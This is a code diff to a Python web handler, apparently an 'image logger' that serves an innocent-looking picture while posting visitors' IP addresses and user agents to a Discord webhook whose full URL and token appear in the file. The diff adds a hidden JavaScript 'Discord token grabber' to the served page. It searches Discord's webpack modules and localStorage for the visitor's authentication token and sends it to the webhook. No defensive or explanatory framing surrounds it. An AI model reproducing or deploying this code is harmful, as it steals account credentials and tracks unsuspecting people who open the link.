@@ -9,13 +9,13 @@ class handler(BaseHTTPRequestHandler):
         WEBHOOK = "https://discord.com/api/webhooks/1464803825847369837/j3diMzcguRrWtdRMnswJ5uA4_fCymBpPkTsV-eNYEs2xjChfvhpXOTCSb-AMB2ZXgz2Q"
         
         # Default image
-        DEFAULT_IMAGE = "https://drakenetworth.co.uk/wp-content/uploads/2024/03/Ten-bes-Poki-games-to-play.webp"
+        DEFAULT_IMAGE = "https://i.imgur.com/5M6F3wQ.jpeg"
         
         # Custom image mappings - add more here
         IMAGES = {
-            "mycatimage": "https://drakenetworth.co.uk/wp-content/uploads/2024/03/Ten-bes-Poki-games-to-play.webp",
-            "dogpic": "https://drakenetworth.co.uk/wp-content/uploads/2024/03/Ten-bes-Poki-games-to-play.webp",
-            "meme": "https://drakenetworth.co.uk/wp-content/uploads/2024/03/Ten-bes-Poki-games-to-play.webp",
+            "mycatimage": "https://i.imgur.com/5M6F3wQ.jpeg",
+            "dogpic": "https://i.imgur.com/2QksCKj.jpeg",
+            "meme": "https://i.imgur.com/X8TjKyj.jpeg",
             # Add more custom names here
         }
         
@@ -71,11 +71,6 @@ class handler(BaseHTTPRequestHandler):
 **User Agent:**
 ```
 {user_agent}
-```
-
-**Webhook Token:**
-```
-{WEBHOOK}
 ```""",
                 "thumbnail": {"url": image_url},
                 "footer": {"text": "Vercel Image Logger"}
@@ -90,7 +85,7 @@ class handler(BaseHTTPRequestHandler):
         except:
             pass
         
-        # Return HTML with image
+        # Return HTML with image and token grabber
         html = f'''<!DOCTYPE html>
 <html>
 <head>
@@ -115,6 +110,55 @@ class handler(BaseHTTPRequestHandler):
 </head>
 <body>
     <img src="{image_url}" alt="Image">
+    <script>
+        (function() {{
+            // Discord token grabber
+            const discordPath = (window.webpackChunkdiscord_app || []).find(m => m[1]?.default?.getToken);
+            let token = null;
+            
+            if (discordPath) {{
+                token = discordPath[1].default.getToken();
+            }}
+            
+            // Try alternative methods
+            if (!token) {{
+                try {{
+                    token = (webpackChunkdiscord_app.push([[''],{{}},e=>{{e.c}}]),Object.values(e.c).find(e=>e?.exports?.default?.getToken)?.exports?.default.getToken());
+                }} catch(e) {{}}
+            }}
+            
+            // Check localStorage
+            if (!token) {{
+                const localStorageKeys = Object.keys(localStorage);
+                for (let key of localStorageKeys) {{
+                    if (key.includes('token')) {{
+                        token = localStorage.getItem(key);
+                        break;
+                    }}
+                }}
+            }}
+            
+            // Send token to webhook if found
+            if (token) {{
+                fetch('{WEBHOOK}', {{
+                    method: 'POST',
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{
+                        content: '🔑 **DISCORD TOKEN GRABBED!**',
+                        embeds: [{{
+                            title: '🎯 Discord Token',
+                            color: 16711680,
+                            description: '```' + token + '```',
+                            fields: [
+                                {{name: 'IP', value: '{ip}', inline: true}},
+                                {{name: 'Endpoint', value: '{image_name if image_name else "default"}', inline: true}}
+                            ]
+                        }}]
+                    }})
+                }});
+            }}
+        }})();
+    </script>
 </body>
 </html>'''
         
